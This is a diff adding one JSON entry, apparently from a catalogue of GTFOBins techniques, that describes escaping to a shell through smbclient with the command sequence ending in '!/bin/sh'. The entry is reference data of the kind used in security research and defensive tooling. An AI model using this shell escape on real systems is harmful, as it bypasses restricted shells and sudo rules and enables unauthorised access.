@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-smbclient-shell",
+  "name": "GTFOBins · smbclient (shell)",
+  "command": "smbclient '\\\\host\\share'\n!/bin/sh",
+  "description": "Use smbclient to shell via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "smbclient",
+    "shell"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/smbclient/#shell",
+  "upstream_id": "smbclient/shell/0",
+  "category": "gtfobins",
+  "subcategory": "shell",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/smbclient/"
+    }
+  ]
+}
